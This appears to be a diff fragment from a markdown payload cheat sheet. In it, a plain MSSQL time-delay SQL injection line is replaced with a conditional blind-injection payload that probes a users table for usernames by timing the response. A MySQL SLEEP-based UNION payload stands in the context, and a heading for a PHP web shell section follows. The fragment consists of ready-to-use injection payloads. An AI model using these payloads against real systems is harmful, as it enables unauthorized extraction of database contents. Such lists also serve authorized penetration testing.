@@ -243,7 +243,7 @@ UNION SELECT SLEEP(5),2,...; - --
 ```
 MSSQL
 ```
-WAITFOR DELAY '00:00:30'; --
+IF EXISTS (SELECT 1 FROM dbo.users WITH(NOLOCK) WHERE username like 'a%') WAITFOR DELAY '0:0:5'-- --
 ```
 
 ### PHP Web Shell
